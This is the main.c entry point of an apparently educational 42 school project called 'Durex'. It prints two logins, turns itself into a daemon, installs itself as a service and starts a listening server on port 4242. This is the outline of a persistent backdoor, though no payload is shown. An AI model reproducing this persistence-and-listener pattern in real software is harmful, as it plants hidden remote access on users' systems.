/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 13:28:52 by banthony          #+#    #+#             */
/*   Updated: 2019/11/12 15:06:20 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Durex.h"

int main(void)
{
	t_server server;
	puts("banthony\nlfourque");
	if (!daemonize("./"))
		return (EXIT_FAILURE);
	install_service();
	create_server(&server, 4242);
	server_loop(&server);
	return (EXIT_SUCCESS);
}
